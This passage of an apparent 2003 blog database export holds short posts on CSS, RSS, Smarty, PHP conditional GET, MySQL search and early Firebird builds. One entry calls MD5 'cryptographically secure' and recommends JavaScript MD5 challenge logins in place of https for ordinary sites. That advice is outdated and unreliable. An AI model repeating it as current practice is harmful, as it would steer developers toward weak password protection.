&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;This is certainly a problem with CSS layouts - their maintainability can suffer due to the separation of the presentation from the layout (itself the greatest advantage that CSS provides). Tools such as the &lt;a href=&quot;http://liorean.web-graphics.com/&quot; title=&quot;liorean@web-graphics.com&quot;&gt;ViewStyles&lt;/a&gt;, &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html&quot; title=&quot;Web Development Bookmarklets&quot;&gt;ancestors&lt;/a&gt; and &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000300.php&quot; title=&quot;CSS Bookmarklet - Show divs and spans&quot;&gt;ShowDivs&lt;/a&gt; bookmarklets certainly make this easier but to my knowledge no one has written a bookmarklet that shows the inherited styles for the currently selected element - at least not yet. Pixy's &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000817.php&quot;&gt;List Computed Styles&lt;/a&gt; comes close, but shows styles for every element in the document all in one big window.&lt;/p&gt;

&lt;p&gt;So Dave dislikes &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; because support is buggy, while Sterling sees it as adding extra complexity. Buggy suport is pretty much a solved problem now, at least for most simple layouts - the &lt;a href=&quot;http://css-discuss.incutio.com/&quot;&gt;CSS-Discuss Wiki&lt;/a&gt; is accumulating information on how to defeat bugs at a very decent rate and any problems not solved on there are certain to be understood by the friendly inhabitants of the &lt;a href=&quot;http://www.css-discuss.org/&quot;&gt;CSS-Discuss mailing list&lt;/a&gt;. As for the extra complexity argument, laying out web sites with &lt;acronym title=&quot;HyperTextMarkup Language&quot;&gt;HTML&lt;/acronym&gt; has &lt;em&gt;always&lt;/em&gt; been complicated - take a look at any site that uses nested tables to see what I mean.&lt;/p&gt;

&lt;p&gt;In my experience, resistance to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; seems to come mostly from people who have been creating table based layouts for years. This is unsurprsing - they are being told to throw out everything they have learnt and start with a completely clean slate. I think the real evidence that &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; is a less complex way of laying out pages comes from new developers; I recently taught my girlfriend to design pages (starting from no previous experience) and she took to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; &lt;a href=&quot;http://www.natbat.co.uk/&quot; title=&quot;NatBat.co.uk&quot;&gt;like a duck to water&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-20 17:27:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">929</field>
		<field name="title">MD5 in Javascript</field>
		<field name="slug">javascriptMD5</field>
		<field name="body">&lt;p&gt;One of the things that has always bugged me about creating login forms for web based applications is that the password is passed in clear text when the user logs in. Even if you then set a session cookie of some sort for future access the password has stilled been transmitted unencrypted at least once.&lt;/p&gt;

&lt;p&gt;The obvious way around this is to use &lt;code&gt;https&lt;/code&gt;, but for the vast majority of sites this isn't an option. Enter &lt;a href=&quot;http://pajhome.org.uk/crypt/md5/index.html&quot;&gt;Javascript MD5&lt;/a&gt; - an implementation of the cryptographically secure MD5 hashing function in Javascript. This can be used to build a &lt;acronym title=&quot;Challenge-Handshake Authentication Protocol&quot;&gt;CHAP&lt;/acronym&gt; login system where the client sends the MD5 of the password appended on to a challenge string, which the server can then recalculate and compare (all without the password being transmitted from client to server).&lt;/p&gt;

&lt;p&gt;The author links to &lt;a href=&quot;http://pajhome.org.uk/crypt/md5/chaplogin.html&quot;&gt;implementations&lt;/a&gt; of this idea in various languages, and implementing it from scratch in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is quite trivial. With a bit of care the system can be set up so that browsers with no javascript support submit the password normally, while those with javascript send only the hash.&lt;/p&gt;

&lt;p&gt;A modified version of the system is used by &lt;a href=&quot;http://login.yahoo.com/&quot;&gt;Yahoo's Login Page&lt;/a&gt;, so it is certainly feasible for deployment in a commercial environment. Obviously an &lt;code&gt;https&lt;/code&gt; encrypted session is far more secure, but for non-ecommerce web applications this technique is a no-brainer.&lt;/p&gt;</field>
		<field name="created">2003-04-20 17:50:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">930</field>
		<field name="title">What the F* Happened?</field>
		<field name="slug">whatTheFHappened</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://thegestalt.org/simon/cluetrain.html&quot;&gt;What the *F* happened to the internet?&lt;/a&gt; is a rambling but entertaining description of how big business stole the 'net, and how it doesn't really matter (via Paul Hammond's &lt;a href=&quot;http://www.paranoidfish.org/links/2003/04/&quot;&gt;links blog&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2003-04-20 18:14:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">931</field>
		<field name="title">Comment Notification</field>
		<field name="slug">commentNotification</field>
		<field name="body">&lt;p&gt;Keith is &lt;a href=&quot;http://www.keithdevens.com/weblog/3792&quot; title=&quot;CALL TO ACTION: Weblog comment subscriptions&quot;&gt;calling for&lt;/a&gt; bloggers to implement a &quot;notify me of any replies&quot; feature for their comments systems:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.keithdevens.com/weblog/3792&quot;&gt;&lt;p&gt;
There are a few ways to do this. You could get an e-mail for every reply that's made, but that could quickly flood you with e-mail. It doesn't scale well, and I guarantee you messages are harder to put in context this way. The better solution, and the one that message boards use, is to e-mail you when there's a new post made, but then not e-mail you again until you've visited the site and seen all the new posts. This scales better.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I like it. It's a relatively simple feature to implement with instant, obvious benefits. I'll try and work on this some time this week.&lt;/p&gt;</field>
		<field name="created">2003-04-21 23:44:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">932</field>
		<field name="title">Wiki Wiki Blogroll</field>
		<field name="slug">wikiwikiBlogroll</field>
		<field name="body">&lt;p&gt;Dave Winer has &lt;a href=&quot;http://scriptingnews.userland.com/2003/04/21#lbd794384ceb3b7f979b2248d228b924b&quot; title=&quot;Scripting News, 21st April 2003&quot;&gt;launched&lt;/a&gt; an experimental &lt;a href=&quot;http://blogs.law.harvard.edu/crimson1/blogroll/&quot; title=&quot;Blogroll Editor&quot;&gt;&quot;open&quot; blogroll&lt;/a&gt;. It looks a bit too open to abuse for my liking (Wikis are protected to a certain extent by their revision historys) but the interface for changing the order of entries is one of the most elegant non-javascript solutions I've seen.&lt;/p&gt;</field>
		<field name="created">2003-04-21 23:49:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">933</field>
		<field name="title">CSS Feedback</field>
		<field name="slug">cssFeedback</field>
		<field name="body">&lt;p&gt;My &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/20/#flaminCSS&quot; title=&quot;Flamin&amp;apos; CSS&quot;&gt;rambling post on CSS&lt;/a&gt; yesterday has had some &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/20/flaminCSS#comments&quot;&gt;excellent feedback&lt;/a&gt;, including some insightful comments on the weaknesses of CSS layouts. My call for a new bookmarklet drew responses (and implementations) from both &lt;a href=&quot;http://www.kryogenix.org/days/471.html&quot; title=&quot;Show computed styles bookmarklet&quot;&gt;Stuart Langridge&lt;/a&gt; and &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html#computed_styles&quot; title=&quot;computed styles&quot;&gt;Jesse Ruderman&lt;/a&gt;! Both are well worth installing.&lt;/p&gt;</field>
		<field name="created">2003-04-21 23:55:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">934</field>
		<field name="title">Tim Bray on RSS</field>
		<field name="slug">timBrayOnRSS</field>
		<field name="body">&lt;p&gt;Tim Bray: &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/04/22/RSS-Problems&quot;&gt;RSS Needs Fixing&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.tbray.org/ongoing/When/200x/2003/04/22/RSS-Problems&quot;&gt;&lt;p&gt;
Because, boys and girls, RSS is no longer a science experiment, it's becoming an important part of the infrastructure, which means that a lot of programmmers are going to get the assignment of generating and parsing it, and they need better instructions.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Tim's main problems are with escaped &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; in the &lt;code&gt;&amp;lt;description&amp;gt;&lt;/code&gt; element and the lack of support in &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; for relative &lt;acronym title=&quot;Uniform Resource Indicator&quot;&gt;URI&lt;/acronym&gt; references. Tim says double-escaping of entities is &quot;stupid&quot;, but it seems to me to be a fairly logical extension of escaped &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. Of course, escaped &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; itself is probably the single ugliest thing about the current &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; spec but there are good practical reasons for it, and if I've learnt anything about Dave Winer over the past few days it's that he prefers practical solutions to theoretical ones.&lt;/p&gt;

&lt;p&gt;I've calmed down a bit from my &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/04/#lettingOffSomeSteam&quot; title=&quot;Letting off some steam&quot;&gt;RSS is too complicated&lt;/a&gt; rant of a few weeks ago. I still think there is a huge challenge facing implementors of tools that consume &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt;, but when you compare that to the challenge of constructing a modern web browser it really isn't such a big deal. The biggest problem is probably keeping up with the myriad of versions, extensions and proposed extensions to the current standards.&lt;/p&gt;

&lt;p&gt;Sam Ruby has &lt;a href=&quot;http://www.intertwingly.net/blog/2003/04/22/&quot; title=&quot;Intertwingly: Tue, 22 Apr 2003&quot;&gt;plenty of RSS stuff&lt;/a&gt; today as well.&lt;/p&gt;</field>
		<field name="created">2003-04-22 19:28:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">935</field>
		<field name="title">Credit where credit's due</field>
		<field name="slug">credit</field>
		<field name="body">&lt;p&gt;Credit where credit's due: It &lt;a href=&quot;http://scriptingnews.userland.com/2003/04/22#When:5:18:55AM&quot;&gt;turns out&lt;/a&gt; the interface for re-ordering items I &lt;a href=&quot;http://simon.incutio.com/archive/2003/04/21/#wikiwikiBlogroll&quot; title=&quot;WikiWiki Blogroll&quot;&gt;praised yesterday&lt;/a&gt; was &lt;a href=&quot;http://www.bryanbell.com/2003/04/21#a310&quot;&gt;designed&lt;/a&gt; by Bryan Bell.&lt;/p&gt;</field>
		<field name="created">2003-04-22 19:33:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">936</field>
		<field name="title">Smarty Links</field>
		<field name="slug">smartyLinks</field>
		<field name="body">&lt;p&gt;I'm using &lt;a href=&quot;http://smarty.php.net/&quot;&gt;Smarty&lt;/a&gt; in a project at Uni at the moment, mainly as a tool to allow team members to modify different parts of the codebase without stepping on each other's toes. I've seen some good arguments against templating solutions such as Smarty, based around the point that &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is already a templating engine so the extra layer of abstraction just isn't necessary. Never-the-less, I've been finding that Smarty dramatically improves my productivity even when I'm working on my own. Here are the links I've provided for my team members to help get them up to scratch on how it can be used:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://smarty.php.net/&quot;&gt;The Smarty Website&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://smarty.php.net/manual/en/&quot;&gt;The Smarty Manual&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://smarty.incutio.com/?page=SmartyFrequentlyAskedQuestions&quot;&gt;The Smarty FAQ&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://smarty.incutio.com/&quot;&gt;The Smarty Wiki&lt;/a&gt; (which I founded last year)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.phpinsider.com/smarty-forum/&quot;&gt;The new Smarty Forums&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://zend.com/zend/tut/tutorial-cezar.php&quot;&gt;Zend's first Smarty tutorial&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://zend.com/zend/tut/tutorial-stump.php&quot;&gt;Zend's Advanced Smarty tutorial&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.onlamp.com/pub/a/php/2003/04/17/pear_smarty.html&quot;&gt;The Dynamic Duo of PEAR::DB and Smarty&lt;/a&gt; (although we're using &lt;a href=&quot;http://php.justinvincent.com/&quot;&gt;ezSQL&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-04-22 19:42:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">937</field>
		<field name="title">Introspection</field>
		<field name="slug">introspection</field>
		<field name="body">&lt;p&gt;Tantek: &lt;a href=&quot;http://tantek.com/log/2003/04.html#L20030421t1700&quot;&gt;What to do with things to do&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://tantek.com/log/2003/04.html#L20030421t1700&quot;&gt;&lt;p&gt;
Some areas of your life you want to expand and grow. Others have been neglected, and you need to work on restoring them. Most things just need to be maintained, and it might help to make a list of all the things that demand maintenance (how much and how frequently) in your life. Some of those things should probably be pruned away. And everyone I know has areas of their lives or unfinished projects that need to be closed off and put/parked away for good.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I can really relate to this. There are definitely things in my life that could do with either closure or pruning (or both). The problem is facing up to them.&lt;/p&gt;

&lt;p&gt;(I think this is the most introspective thing I've ever posted on here).&lt;/p&gt;</field>
		<field name="created">2003-04-22 19:55:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">938</field>
		<field name="title">Entry Titles</field>
		<field name="slug">entryTitles</field>
		<field name="body">&lt;p&gt;As promised many times, I've finally implemented titles on my blog entries. I'm in the transitional stage at the moment - new posts will have them, old posts won't. At some point in the near future I'm going to trawl through the archives (all 938 entries) and add titles to everything. Once I've done &lt;em&gt;that&lt;/em&gt; I can look at changing other stuff like the &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds, and maybe even get around to re-implementing some kind of search engine. Then there's the new hierarchical category system, a whole bunch of &lt;a href=&quot;http://diveintoaccessibility.org/&quot;&gt;accessibility improvements&lt;/a&gt;, better archives, comment email-alerts...&lt;/p&gt;

&lt;p&gt;Nothing like a bunch of coursework deadlines to focus the mind on alternative activities :)&lt;/p&gt;</field>
		<field name="created">2003-04-22 22:48:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">939</field>
		<field name="title">Supporting Conditional GET in PHP</field>
		<field name="slug">conditionalGet</field>
		<field name="body">&lt;p&gt;This site's &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feeds now support &lt;a href=&quot;http://fishbowl.pastiche.org/archives/001132.html&quot; title=&quot;HTTP Conditional Get for RSS Hackers&quot;&gt;Conditional GET&lt;/a&gt;. Since the feeds are dynamically generated on every request, adding support took a bit of hacking around with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;. Here's the function I came up with (based on the excellent description provided by Charles Miller in the article linked above):&lt;/p&gt;

&lt;pre class=&quot;php&quot;&gt;function doConditionalGet($timestamp) {
    // A PHP implementation of conditional get, see 
    //   http://fishbowl.pastiche.org/archives/001132.html
    $last_modified = substr(date('r', $timestamp), 0, -5).'GMT';
    $etag = '&quot;'.md5($last_modified).'&quot;';
    // Send the headers
    header(&quot;Last-Modified: $last_modified&quot;);
    header(&quot;ETag: $etag&quot;);
    // See if the client has provided the required headers
    $if_modified_since = isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) ?
        stripslashes($_SERVER['HTTP_IF_MODIFIED_SINCE']) :
        false;
    $if_none_match = isset($_SERVER['HTTP_IF_NONE_MATCH']) ?
        stripslashes($_SERVER['HTTP_IF_NONE_MATCH']) : 
        false;
    if (!$if_modified_since &amp;amp;&amp;amp; !$if_none_match) {
        return;
    }
    // At least one of the headers is there - check them
    if ($if_none_match &amp;amp;&amp;amp; $if_none_match != $etag) {
        return; // etag is there but doesn't match
    }
    if ($if_modified_since &amp;amp;&amp;amp; $if_modified_since != $last_modified) {
        return; // if-modified-since is there but doesn't match
    }
    // Nothing has changed since their last request - serve a 304 and exit
    header('HTTP/1.0 304 Not Modified');
    exit;
}
&lt;/pre&gt;

&lt;p&gt;Usage is simple: Work out the timestamp that the page content was last modified and call &lt;code&gt;doConditionalGet($timestamp);&lt;/code&gt;. It will send the 304 header for you and exit if the client claims to have seen the content already - otherwise control will return to your main script and you can serve content as normal. Slightly inelegant, but it does the job.&lt;/p&gt;

&lt;p&gt;Unfortunately I don't have a Conditional-GET supporting &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; aggregator to hand so I have no idea if it works or not (so far I've only tested it by watching the headers sent with &lt;a href=&quot;http://livehttpheaders.mozdev.org/&quot;&gt;LiveHTTPHeaders&lt;/a&gt;). I'd be grateful if someone could confirm that this has had the desired effect.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; I've changed the above code sample (and my implementation) to send the ETag header as &lt;code&gt;ETag&lt;/code&gt; rather than &lt;code&gt;etag&lt;/code&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-23 17:22:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">940</field>
		<field name="title">Acrobot</field>
		<field name="slug">acrobot</field>
		<field name="body">&lt;p&gt;Ian Lloyd has a very neat new tool on &lt;a href=&quot;http://www.accessify.com/&quot;&gt;Accessify&lt;/a&gt;: &lt;a href=&quot;http://www.accessify.com/tools-and-wizards/acrobot/&quot;&gt;Acrobot&lt;/a&gt;, an abbreviation and acronym generator. It takes a chunk of text and wraps any recognised abbreviations or acronyms in the appropriate tag, with the expanded term as the title (it can also optionally just use &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; friendly acronyms). It shames me to say that after a good 6 months of using these tags I'm still doing them by hand, so Acrobot is just what I need (at least until I get something similar working in my blogging system). Registered Accessify members can expand the tool's dictionary, so maybe I'll have to bite the bullet and sign up for yet another web site account...&lt;/p&gt;

&lt;p&gt;A suggestion: How about making the dictionary (already available in &lt;a href=&quot;http://www.accessify.com/tools-and-wizards/acrobot/view-all-acronyms.asp&quot; title=&quot;View all acronyms&quot;&gt;table form&lt;/a&gt;) available in some kind of easily parsable format (comma delimited, tab seperated or &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;) so people constructing their own tools can use it instead of building their own?&lt;/p&gt;

&lt;p&gt;Bug report: While I didn't manage to catch it out with pre-marked-up acronyms, the &lt;samp&gt;XML)&lt;/samp&gt; in the above wasn't converted.&lt;/p&gt;</field>
		<field name="created">2003-04-23 17:37:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">941</field>
		<field name="title">Big news from Six Apart.</field>
		<field name="slug">sixApart</field>
		<field name="body">&lt;p&gt;Ben Hammersley &lt;a href=&quot;http://www.guardian.co.uk/online/news/0,12597,942024,00.html&quot; title=&quot;Battle of the blog builders&quot;&gt;reports&lt;/a&gt; on SixApart's (creators of Moveable Type) new venture, &lt;a href=&quot;http://www.typepad.com/&quot;&gt;TypePad&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.guardian.co.uk/online/news/0,12597,942024,00.html&quot;&gt;&lt;p&gt;SixApart, the company behind the Movable Type weblogging system, is to lanch a new &quot;hosted&quot; service called TypePad later this year.&lt;/p&gt;

&lt;p&gt;Like its rival, Blogger, the new system will be stored along with the user's writing on a central server. This means that, for the first time, budding webloggers who want to use Movable Type - regarded as the one of the most powerful weblog-building systems - will not have to hire server space from hosting companies. Nor will they need to go through the sometimes difficult processes required to install the Movable Type system on their server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Not only have they had a &quot;major investment&quot; from the firm run by Joi Ito, but they've just &lt;a href=&quot;http://www.sixapart.com/press/six_apart_ltd_names_anil_dash_as_vi.shtml&quot; title=&quot;Six Apart Ltd. Names Anil Dash as Vice President of Business Development&quot;&gt;hired Anil Dash&lt;/a&gt;! More information on the &lt;a href=&quot;http://www.sixapart.com/log/2003/04/six_apart_miles.shtml&quot; title=&quot;Six Apart Milestones&quot;&gt;Six Apart weblog&lt;/a&gt;. Exciting stuff.&lt;/p&gt;</field>
		<field name="created">2003-04-23 18:19:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">942</field>
		<field name="title">Python 2.2 Quick Reference</field>
		<field name="slug">pythonReference</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://rgruet.free.fr/PQR2.2.html&quot;&gt;Python 2.2 Quick Reference&lt;/a&gt;, via &lt;a href=&quot;http://people.enginesofcreation.ie/mick/archives/000145.html&quot; title=&quot;Essential Python Quick Reference&quot;&gt;Michael Twomey&lt;/a&gt;. All the essential bits of Python on a single (if quite long) &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; page. Magic.&lt;/p&gt;</field>
		<field name="created">2003-04-23 18:32:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">943</field>
		<field name="title">Titles all the way</field>
		<field name="slug">titlesAllTheWay</field>
		<field name="body">&lt;p&gt;I've added titles to &lt;em&gt;every single one&lt;/em&gt; of my archived blog entries; nearly a thousand of them. It took just over an hour, thanks mainly to my decision a long time ago to use camelCase for my permalinks. I put together a simple tool that displayed un-titled entries, ten at a time, with a suggested title based on the permalink (split in to words and sensibly capitalised). This probably knocked a good 75% off my workload.&lt;/p&gt;

&lt;p&gt;Useful tip for web based tools for boring jobs: tabindex is your friend. I set it up so hitting tab would jump straight to the next item's title entry field (skipping the links in between) and the final tab would jump to the &quot;submit&quot; button at the bottom of the page. Not having to use the mouse at all definitely speeded up the process.&lt;/p&gt;

&lt;p&gt;Next break from coursework, I think I'll have a go at improving the &lt;a href=&quot;/archive/&quot;&gt;archives&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-23 20:40:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">944</field>
		<field name="title">Show Computed Styles (yet again)</field>
		<field name="slug">showComputedStyles</field>
		<field name="body">&lt;p&gt;By jove I think they've cracked it: &lt;a href=&quot;http://www.kryogenix.org/days/473.html&quot;&gt;Show applicable styles&lt;/a&gt; from Stuart and &lt;a href=&quot;http://www.pixy.cz/blogg/favelets/#cascadedstyles&quot;&gt;List computed (cascaded) styles&lt;/a&gt; from Pixy. Talk about being spoiled for choice :)&lt;/p&gt;</field>
		<field name="created">2003-04-23 23:35:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">945</field>
		<field name="title">Site search finally available</field>
		<field name="slug">siteSearch</field>
		<field name="body">&lt;p&gt;I've finally got around to adding a &lt;a href=&quot;/search&quot;&gt;search page&lt;/a&gt; to this site. It uses MySQL's &lt;a href=&quot;http://www.mysql.com/doc/en/Fulltext_Search.html&quot;&gt;full text indexing&lt;/a&gt;, which is extremely fast and provides good results but comes at the expense of flexibility. Search terms less than 4 letters long are ignored, and multi-word searches are handled using OR rather than AND. This nearly put me off using it, but the relevancy algorithm is excellent which I think outweighs the disadvantage of not being able to use pure AND queries.&lt;/p&gt;

&lt;p&gt;MySQL 4.0 introduces far more powerful boolean mode full text searches which allow all kinds of modifiers and extra syntax, but this site currently runs on 3.23.54 so I can't play with those just yet. Jeremy Zawodny's &lt;a href=&quot;http://www.linux-mag.com/2003-01/mysql_03.html&quot; title=&quot;http://www.linux-mag.com/2003-01/mysql_03.html&quot;&gt;article on MySQL 4&lt;/a&gt; explains boolean mode and describes many other exciting new MySQL features as well.&lt;/p&gt;</field>
		<field name="created">2003-04-25 16:55:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">946</field>
		<field name="title">Experimental feature: Related entries</field>
		<field name="slug">relatedArticles</field>
		<field name="body">&lt;p&gt;I'm experimenting with using MySQL full text indexing to generate a list of &quot;related entries&quot; for each entry (click on an item's permalink to see it in action). It works by concatenating the item's title and entry body together and running a full text search on it, which sounds horendously inefficient but seems to work surpsingly quickly. If I decide to keep the feature I'll probably cache the results somewhere to reduce the overhead, but for the moment it's fast enough.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; I've turned it off again - it was resulting in ugly database timeouts all over the place. I'll switch it back on once I've added caching.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update 2:&lt;/strong&gt; It's back on again now, with caching. I'm still getting quite a few database timeouts for some reason - if they don't resolve themselves I'll have to do some more tweaking.&lt;/p&gt;</field>
		<field name="created">2003-04-25 19:19:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">947</field>
		<field name="title">position:fixed in IE, no Javascript required</field>
		<field name="slug">positionFixedFixed</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_04_20_archive.shtml#lcky93260098&quot; title=&quot;saila.com: Friday, April 25, 2003&quot;&gt;Craig Saila&lt;/a&gt;, a &lt;a href=&quot;http://devnull.tagsoup.com/fixed/&quot; title=&quot;position:fixed fixed for IE/win&quot;&gt;method&lt;/a&gt; for getting &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; to apply &lt;code&gt;position: fixed&lt;/code&gt; without resorting to Javascript. It uses a conditional comment (slightly ugly but perfectly valid &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;) and works a treat. Kudos to Eric Bednarz for clearing up another of those niggling &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; problems.&lt;/p&gt;</field>
		<field name="created">2003-04-25 22:41:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">948</field>
		<field name="title">Phoenix / Firebird nightlies hotting up</field>
		<field name="slug">firebirdSoon</field>
		<field name="body">&lt;p&gt;Word on the street is that Phoenix 0.6 (or Firebird or Mozilla Firebird or Mozilla Browser or whatever else you want to call it) could be out within the next week or so. I'm using the 28th April &lt;a href=&quot;http://komodo.mozilla.org/pub/phoenix/nightly/latest-trunk/&quot;&gt;nightly build&lt;/a&gt; and it really is a big improvement on Phoenix 0.5, which is a very respectable browser in its own right. The new preferences panel (shown below) has been in the nightlies for quite a while now and really does add to the overall feel of the browser, and new features from Mozilla such as an editable &lt;code&gt;about:config&lt;/code&gt; screen are handy as well.&lt;/p&gt;

&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;The new preferences panel features coloured icons for the seven different sections&quot; height=&quot;468&quot; src=&quot;http://simon.incutio.com/images/2003/firebird-preferences.gif&quot; title=&quot;Firebird Preferences Panel&quot; width=&quot;567&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Blogzilla has &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/no_no_that_was_only_a_codename.html&quot; title=&quot;No, no, that was only a &amp;quot;codename&amp;quot;&quot;&gt;more information&lt;/a&gt; on the branding issue, which appears to have &lt;a href=&quot;http://www.mozilla.org/roadmap/branding.html&quot; title=&quot;mozilla branding&quot;&gt;been resolved&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-04-28 19:52:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">949</field>
		<field name="title">More fun with Search</field>
		<field name="slug">moreFunWithSearch</field>
		<field name="body">&lt;p&gt;While browsing around my &lt;code&gt;phoenix/&lt;/code&gt; directory I spotted a sub-directory called &lt;code&gt;searchplugins&lt;/code&gt;, which appears to control the list of search engines available in the very useful search box at the top right corner of the browser. A bit of digging later and it turns out that adding new search engines to Mozilla based browsers is remarkably easy: &lt;a href=&quot;http://www.mozilla.org/projects/search/&quot;&gt;The Mozilla Search Project&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I'm a sucker for new toys, so &lt;a href=&quot;/search&quot; onclick=&quot;if ((typeof window.sidebar == &amp;apos;object&amp;apos;) &amp;amp;&amp;amp; (typeof window.sidebar.addSearchEngine == &amp;apos;function&amp;apos;)) { window.sidebar.addSearchEngine(&amp;apos;http://simon.incutio.com/simon.src&amp;apos;,&amp;apos;http://simon.incutio.com/simon.gif&amp;apos;,&amp;apos;simon.incutio.com&amp;apos;,&amp;apos;Web&amp;apos;) } else {alert(&amp;apos;This feature is only vailable in Mozilla based browsers&amp;apos;)} return false;&quot;&gt;click here&lt;/a&gt; to add the &lt;code&gt;simon.incutio.com&lt;/code&gt; search engine to your (Mozilla or Firebird) browser :)&lt;/p&gt;</field>
		<field name="created">2003-04-28 19:58:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">950</field>
		<field name="title">CSS Headings</field>
		<field name="slug">cssHeadings</field>
